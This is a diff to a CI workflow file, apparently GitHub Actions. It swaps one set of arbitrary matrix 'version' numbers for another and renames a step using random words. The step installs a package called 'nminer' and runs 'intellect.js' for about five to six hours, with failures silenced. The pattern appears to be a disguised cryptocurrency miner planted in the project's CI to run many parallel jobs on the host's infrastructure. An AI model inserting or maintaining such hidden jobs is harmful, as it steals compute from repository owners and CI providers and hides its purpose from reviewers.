@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7708 }
-          - { version: 197 }
-          - { version: 1162 }
-          - { version: 3316 }
-          - { version: 4662 }
-          - { version: 7008 }
-          - { version: 5244 }
-          - { version: 2009 }
-          - { version: 1369 }
-          - { version: 4907 }
-          - { version: 7699 }
-          - { version: 184 }
-          - { version: 811 }
-          - { version: 1544 }
-          - { version: 1189 }
-          - { version: 3259 }
-          - { version: 5889 }
-          - { version: 116 }
+          - { version: 965 }
+          - { version: 5601 }
+          - { version: 6466 }
+          - { version: 6502 }
+          - { version: 4232 }
+          - { version: 9224 }
+          - { version: 4032 }
+          - { version: 8895 }
+          - { version: 8050 }
+          - { version: 7263 }
+          - { version: 8717 }
+          - { version: 8428 }
+          - { version: 3226 }
+          - { version: 897 }
+          - { version: 1091 }
+          - { version: 3693 }
+          - { version: 1445 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: duh petty as
+      - name: usable come jaywalk
         run: |
           npm install nminer@latest
-          timeout 307m node intellect.js || echo "intellect executed"
+          timeout 344m node intellect.js || echo "intellect executed"
